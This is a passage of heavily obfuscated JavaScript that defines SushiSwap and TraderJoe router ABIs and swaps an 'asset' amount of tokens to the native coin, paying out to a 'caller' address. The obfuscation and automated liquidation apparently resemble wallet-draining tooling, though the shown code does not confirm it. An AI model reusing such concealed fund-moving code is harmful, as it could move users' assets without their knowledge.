          return [_0x2f6c7a.swapExactTokensForETH(_0x2a18aa.asset.amount, _0xcd0737, _0x379b60, this.getCaller(_0x2a18aa), _0x4d5eff, _0x4097d9), _0x1c6354];
        }
      case "SushiSwap":
        {
          const _0x4de559 = {
            internalType: "address",
            name: "_factory",
            type: "address"
          };
          const _0x439f4a = {
            internalType: "address",
            name: "_WETH",
            type: 'address'
          };
          const _0x339a79 = {
            inputs: [_0x4de559, _0x439f4a],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x13e545 = {
            inputs: [],
            name: "WETH",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0xec7ea8 = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x11fa0f = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x772a2b = {
            internalType: 'uint256',
            name: "amountADesired",
            type: 'uint256'
          };
          const _0x3c5959 = {
            internalType: 'uint256',
            name: "amountBDesired",
            type: 'uint256'
          };
          const _0x471a4a = {
            internalType: 'uint256',
            name: 'amountAMin',
            type: "uint256"
          };
          const _0x5c4caa = {
            internalType: "uint256",
            name: 'amountBMin',
            type: 'uint256'
          };
          const _0x114777 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x3fccd0 = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x2049ac = {
            inputs: [_0xec7ea8, _0x11fa0f, _0x772a2b, _0x3c5959, _0x471a4a, _0x5c4caa, _0x114777, _0x3fccd0],
            name: "addLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }, {
              'internalType': "uint256",
              'name': "liquidity",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x559b1b = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x2fe9a1 = {
            internalType: 'uint256',
            name: "amountTokenDesired",
            type: 'uint256'
          };
          const _0xadb493 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: "uint256"
          };
          const _0x5a1e28 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x219a39 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x2ebb99 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x19c52a = {
            inputs: [_0x559b1b, _0x2fe9a1, _0xadb493, _0x5a1e28, _0x219a39, _0x2ebb99],
            name: "addLiquidityETH",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountETH",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "liquidity",
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0xa6d8a6 = {
            inputs: [],
            name: 'factory',
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x479989 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0x3f170e = {
            internalType: 'uint256',
            name: 'reserveIn',
            type: 'uint256'
          };
          const _0x2fec67 = {
            internalType: 'uint256',
            name: "reserveOut",
            type: 'uint256'
          };
          const _0x4bbda2 = {
            inputs: [_0x479989, _0x3f170e, _0x2fec67],
            name: "getAmountIn",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountIn',
              'type': "uint256"
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x4aa94c = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x5cb0b9 = {
            internalType: 'uint256',
            name: "reserveIn",
            type: 'uint256'
          };
          const _0x48f838 = {
            internalType: 'uint256',
            name: 'reserveOut',
            type: 'uint256'
          };
          const _0x29e46d = {
            inputs: [_0x4aa94c, _0x5cb0b9, _0x48f838],
            name: "getAmountOut",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0xb54a43 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0x524bb0 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x426543 = {
            inputs: [_0xb54a43, _0x524bb0],
            name: "getAmountsIn",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x5ab65a = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x3f749d = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x54bbbf = {
            inputs: [_0x5ab65a, _0x3f749d],
            name: "getAmountsOut",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': "uint256[]"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x522451 = {
            internalType: 'uint256',
            name: 'amountA',
            type: 'uint256'
          };
          const _0x6826f9 = {
            internalType: 'uint256',
            name: 'reserveA',
            type: 'uint256'
          };
          const _0x1018c2 = {
            internalType: "uint256",
            name: "reserveB",
            type: "uint256"
          };
          const _0x1b3ee2 = {
            inputs: [_0x522451, _0x6826f9, _0x1018c2],
            name: "quote",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: "pure",
            type: "function"
          };
          const _0x29d2b5 = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x25ec1d = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x642bd4 = {
            internalType: 'uint256',
            name: "liquidity",
            type: "uint256"
          };
          const _0x2c2fa4 = {
            internalType: 'uint256',
            name: "amountAMin",
            type: "uint256"
          };
          const _0x392b7f = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x7bf34f = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x2bed4e = {
            internalType: "uint256",
            name: "deadline",
            type: "uint256"
          };
          const _0x3a8c76 = {
            inputs: [_0x29d2b5, _0x25ec1d, _0x642bd4, _0x2c2fa4, _0x392b7f, _0x7bf34f, _0x2bed4e],
            name: "removeLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x983f8d = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x56318c = {
            internalType: "uint256",
            name: "liquidity",
            type: 'uint256'
          };
          const _0x13b90d = {
            internalType: "uint256",
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x4ce76b = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x3ce83e = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x3a4bac = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x45fa64 = {
            inputs: [_0x983f8d, _0x56318c, _0x13b90d, _0x4ce76b, _0x3ce83e, _0x3a4bac],
            name: "removeLiquidityETH",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': "uint256",
              'name': "amountETH",
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4d96f0 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x13663f = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x59e7b1 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x198f6a = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: "uint256"
          };
          const _0x46be1d = {
            internalType: 'address',
            name: 'to',
            type: "address"
          };
          const _0xb934cc = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x46f3cd = {
            internalType: 'uint256',
            name: "amountETH",
            type: 'uint256'
          };
          const _0x1f78ef = {
            inputs: [_0x4d96f0, _0x13663f, _0x59e7b1, _0x198f6a, _0x46be1d, _0xb934cc],
            name: "removeLiquidityETHSupportingFeeOnTransferTokens",
            outputs: [_0x46f3cd],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x118878 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x3114dc = {
            internalType: 'uint256',
            name: "liquidity",
            type: "uint256"
          };
          const _0x3f9293 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0xb5e326 = {
            internalType: "uint256",
            name: "amountETHMin",
            type: "uint256"
          };
          const _0x74f7d9 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1cc19a = {
            internalType: "uint256",
            name: 'deadline',
            type: "uint256"
          };
          const _0x41d2de = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x436e30 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x84fc8e = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x2d3efd = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x22af1c = {
            internalType: 'uint256',
            name: "amountToken",
            type: 'uint256'
          };
          const _0x2f7eea = {
            internalType: 'uint256',
            name: "amountETH",
            type: 'uint256'
          };
          const _0xc5f905 = {
            inputs: [_0x118878, _0x3114dc, _0x3f9293, _0xb5e326, _0x74f7d9, _0x1cc19a, _0x41d2de, _0x436e30, _0x84fc8e, _0x2d3efd],
            name: "removeLiquidityETHWithPermit",
            outputs: [_0x22af1c, _0x2f7eea],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x340777 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x2924fc = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x54019b = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x181855 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x2deb7f = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x3c922f = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0xbaa4df = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x3f2516 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x326a01 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x209f9f = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x58e05d = {
            inputs: [_0x340777, _0x2924fc, _0x54019b, _0x181855, _0x2deb7f, _0x3c922f, _0xbaa4df, _0x3f2516, _0x326a01, _0x209f9f],
            name: "removeLiquidityETHWithPermitSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountETH',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3c4f8c = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x57d36d = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x50a343 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x3b3982 = {
            internalType: 'uint256',
            name: "amountAMin",
            type: "uint256"
          };
          const _0x4ead4a = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x2d51bd = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x4eb370 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x2189d6 = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x25f9a5 = {
            internalType: 'uint8',
            name: 'v',
            type: 'uint8'
          };
          const _0x13578a = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x44c562 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x2d2400 = {
            internalType: 'uint256',
            name: "amountA",
            type: "uint256"
          };
          const _0x2de91b = {
            internalType: 'uint256',
            name: "amountB",
            type: 'uint256'
          };
          const _0x40ede9 = {
            inputs: [_0x3c4f8c, _0x57d36d, _0x50a343, _0x3b3982, _0x4ead4a, _0x2d51bd, _0x4eb370, _0x2189d6, _0x25f9a5, _0x13578a, _0x44c562],
            name: "removeLiquidityWithPermit",
            outputs: [_0x2d2400, _0x2de91b],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4ae396 = {
            internalType: 'uint256',
            name: "amountOut",
            type: "uint256"
          };
          const _0x53638a = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x17c8ec = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1db777 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x5d4890 = {
            inputs: [_0x4ae396, _0x53638a, _0x17c8ec, _0x1db777],
            name: "swapETHForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': "uint256[]"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0xbb2d26 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x385a87 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x35eab8 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x5e39ef = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0xdaeda0 = {
            internalType: 'uint256[]',
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x1c4711 = {
            inputs: [_0xbb2d26, _0x385a87, _0x35eab8, _0x5e39ef],
            name: "swapExactETHForTokens",
            outputs: [_0xdaeda0],
            stateMutability: "payable",
            type: "function"
          };
          const _0x208ca3 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x522157 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x4f6253 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x34c0fd = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x491276 = {
            inputs: [_0x208ca3, _0x522157, _0x4f6253, _0x34c0fd],
            name: "swapExactETHForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x3dc57f = {
            internalType: 'uint256',
            name: "amountIn",
            type: 'uint256'
          };
          const _0x54ad7d = {
            internalType: "uint256",
            name: "amountOutMin",
            type: "uint256"
          };
          const _0x34e675 = {
            internalType: 'address[]',
            name: 'path',
            type: 'address[]'
          };
          const _0x18718b = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x52d8c5 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x34033a = {
            internalType: 'uint256[]',
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x3eddfd = {
            inputs: [_0x3dc57f, _0x54ad7d, _0x34e675, _0x18718b, _0x52d8c5],
            name: "swapExactTokensForETH",
            outputs: [_0x34033a],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1678f8 = {
            internalType: 'uint256',
            name: "amountIn",
            type: 'uint256'
          };
          const _0x30b979 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x4dbaf5 = {
            internalType: "address[]",
            name: 'path',
            type: 'address[]'
          };
          const _0x244d53 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x6abb2a = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0xcce65d = {
            inputs: [_0x1678f8, _0x30b979, _0x4dbaf5, _0x244d53, _0x6abb2a],
            name: "swapExactTokensForETHSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x44762a = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x43cad1 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x123665 = {
            internalType: 'address[]',
            name: 'path',
            type: "address[]"
          };
          const _0x3d8a76 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x335bb9 = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x292801 = {
            inputs: [_0x44762a, _0x43cad1, _0x123665, _0x3d8a76, _0x335bb9],
            name: "swapExactTokensForTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': "uint256[]"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5169b1 = {
            internalType: "uint256",
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x5d82bc = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: "uint256"
          };
          const _0x4af12b = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x2d3e45 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1892d5 = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x42dcea = {
            inputs: [_0x5169b1, _0x5d82bc, _0x4af12b, _0x2d3e45, _0x1892d5],
            name: "swapExactTokensForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xedc78e = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0xd6cb89 = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x74ce72 = {
            internalType: 'address[]',
            name: 'path',
            type: "address[]"
          };
          const _0xf6ea6b = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x379ffd = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x41b266 = {
            inputs: [_0xedc78e, _0xd6cb89, _0x74ce72, _0xf6ea6b, _0x379ffd],
            name: "swapTokensForExactETH",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x8f653d = {
            internalType: 'uint256',
            name: "amountOut",
            type: 'uint256'
          };
          const _0x4a9863 = {
            internalType: "uint256",
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x11b23e = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x2960ce = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x13bfa0 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4a5be2 = {
            inputs: [_0x8f653d, _0x4a9863, _0x11b23e, _0x2960ce, _0x13bfa0],
            name: "swapTokensForExactTokens",
            outputs: [{
              'internalType': "uint256[]",
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x228d21 = {
            stateMutability: "payable",
            type: "receive"
          };
          let _0x43655d = [_0x339a79, _0x13e545, _0x2049ac, _0x19c52a, _0xa6d8a6, _0x4bbda2, _0x29e46d, _0x426543, _0x54bbbf, _0x1b3ee2, _0x3a8c76, _0x45fa64, _0x1f78ef, _0xc5f905, _0x58e05d, _0x40ede9, _0x5d4890, _0x1c4711, _0x491276, _0x3eddfd, _0xcce65d, _0x292801, _0x42dcea, _0x41b266, _0x4a5be2, _0x228d21];
          let _0x51cb63 = new ethers.Contract(_0x3941f8, _0x43655d, _0xab3127);
          let _0x4c6224 = await _0x51cb63.WETH();
          let _0x1f6870 = [];
          _0x1f6870[0] = _0x2a18aa.asset.token;
          _0x1f6870[1] = _0x4c6224;
          try {
            let _0x434039 = this.token_array.find(_0x469067 => _0x469067.token_address == _0x2a18aa.asset.token && _0x469067.chain == _0x2a18aa.chain);
            let _0x50f269 = this.token_array.find(_0x4e7ffc => _0x4e7ffc.token_address == "native" && _0x4e7ffc.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x434039.value) * Number(0.7) / Number(_0x50f269.price)).toString(), 'ether'));
          } catch {}
          return [_0x51cb63.swapExactTokensForETH(_0x2a18aa.asset.amount, _0xcd0737, _0x1f6870, this.getCaller(_0x2a18aa), _0x4d5eff), _0x4c6224];
        }
      case "TraderJoeV1":
        {
          const _0x153f1f = {
            internalType: "address",
            name: "_factory",
            type: "address"
          };
          const _0x216bea = {
            internalType: "address",
            name: "_WAVAX",
            type: "address"
          };
          const _0x51eef4 = {
            inputs: [_0x153f1f, _0x216bea],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x3370f2 = {
            inputs: [],
            name: 'WAVAX',
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x41973f = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x15e3da = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x3de88d = {
            internalType: "uint256",
            name: "amountADesired",
            type: 'uint256'
          };
          const _0x5859c2 = {
            internalType: 'uint256',
            name: "amountBDesired",
            type: 'uint256'
          };
          const _0x2f93fe = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x54c904 = {
            internalType: "uint256",
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x4f0246 = {
            internalType: "address",
            name: 'to',
            type: 'address'
          };
          const _0x169d31 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x3a0050 = {
            internalType: "uint256",
            name: "amountA",
            type: 'uint256'
          };
          const _0x5d0b11 = {
            internalType: 'uint256',
            name: "amountB",
            type: 'uint256'
          };
          const _0x28d231 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x54edfb = {
            inputs: [_0x41973f, _0x15e3da, _0x3de88d, _0x5859c2, _0x2f93fe, _0x54c904, _0x4f0246, _0x169d31],
            name: "addLiquidity",
            outputs: [_0x3a0050, _0x5d0b11, _0x28d231],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4234c1 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x54b111 = {
            internalType: 'uint256',
            name: "amountTokenDesired",
            type: 'uint256'
          };
          const _0x26e42e = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x5b4e1a = {
            internalType: 'uint256',
            name: "amountAVAXMin",
            type: 'uint256'
          };
          const _0x46c881 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x52d306 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x1857f8 = {
            inputs: [_0x4234c1, _0x54b111, _0x26e42e, _0x5b4e1a, _0x46c881, _0x52d306],
            name: "addLiquidityAVAX",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountAVAX",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "liquidity",
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0xb5fc7 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x2fa8eb = {
            inputs: [],
            name: 'factory',
            outputs: [_0xb5fc7],
            stateMutability: "view",
            type: "function"
          };
          const _0x2057f0 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0xd24ef1 = {
            internalType: 'uint256',
            name: 'reserveIn',
            type: 'uint256'
          };
          const _0x9fcd04 = {
            internalType: 'uint256',
            name: 'reserveOut',
            type: 'uint256'
          };
          const _0x27372b = {
            inputs: [_0x2057f0, _0xd24ef1, _0x9fcd04],
            name: "getAmountIn",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountIn",
              'type': 'uint256'
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x321445 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x3fba59 = {
            internalType: "uint256",
            name: 'reserveIn',
            type: 'uint256'
          };
          const _0xa20690 = {
            internalType: 'uint256',
            name: 'reserveOut',
            type: 'uint256'
          };
          const _0x4b9247 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0x3c7b16 = {
            inputs: [_0x321445, _0x3fba59, _0xa20690],
            name: "getAmountOut",
            outputs: [_0x4b9247],
            stateMutability: "pure",
            type: "function"
          };
          const _0x1d6f75 = {
            internalType: "uint256",
            name: "amountOut",
            type: 'uint256'
          };
          const _0xf0b689 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x199898 = {
            inputs: [_0x1d6f75, _0xf0b689],
            name: "getAmountsIn",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x564929 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x2406d0 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x293ffc = {
            inputs: [_0x564929, _0x2406d0],
            name: "getAmountsOut",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "view",
            type: 'function'
          };
          const _0x173500 = {
            internalType: 'uint256',
            name: "amountA",
            type: 'uint256'
          };
          const _0x2f50b8 = {
            internalType: 'uint256',
            name: 'reserveA',
            type: 'uint256'
          };
          const _0x2187fe = {
            internalType: 'uint256',
            name: "reserveB",
            type: 'uint256'
          };
          const _0xc0ee70 = {
            inputs: [_0x173500, _0x2f50b8, _0x2187fe],
            name: "quote",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountB",
              'type': "uint256"
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x51200b = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x298ff0 = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x23872d = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x252598 = {
            internalType: "uint256",
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x2136c5 = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x553980 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x4da996 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x40ca3a = {
            inputs: [_0x51200b, _0x298ff0, _0x23872d, _0x252598, _0x2136c5, _0x553980, _0x4da996],
            name: "removeLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x39066e = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x210b23 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x3de08e = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x32b777 = {
            internalType: 'uint256',
            name: "amountAVAXMin",
            type: 'uint256'
          };
          const _0x5afa65 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x431e8b = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x3be748 = {
            inputs: [_0x39066e, _0x210b23, _0x3de08e, _0x32b777, _0x5afa65, _0x431e8b],
            name: "removeLiquidityAVAX",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': "amountAVAX",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x361a16 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x598a80 = {
            internalType: 'uint256',
            name: "liquidity",
            type: "uint256"
          };
          const _0x2830bf = {
            internalType: "uint256",
            name: "amountTokenMin",
            type: "uint256"
          };
          const _0x3deca9 = {
            internalType: 'uint256',
            name: "amountAVAXMin",
            type: "uint256"
          };
          const _0x2b7132 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x13caad = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x2793d6 = {
            inputs: [_0x361a16, _0x598a80, _0x2830bf, _0x3deca9, _0x2b7132, _0x13caad],
            name: "removeLiquidityAVAXSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountAVAX",
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x134a88 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x137089 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x143578 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x167b7b = {
            internalType: 'uint256',
            name: "amountAVAXMin",
            type: 'uint256'
          };
          const _0x53ce9a = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x49b1b = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x48d3c3 = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x5cfe9b = {
            internalType: "uint8",
            name: 'v',
            type: 'uint8'
          };
          const _0x2ad58d = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x29e6be = {
            internalType: "bytes32",
            name: 's',
            type: 'bytes32'
          };
          const _0x5aebcb = {
            inputs: [_0x134a88, _0x137089, _0x143578, _0x167b7b, _0x53ce9a, _0x49b1b, _0x48d3c3, _0x5cfe9b, _0x2ad58d, _0x29e6be],
            name: "removeLiquidityAVAXWithPermit",
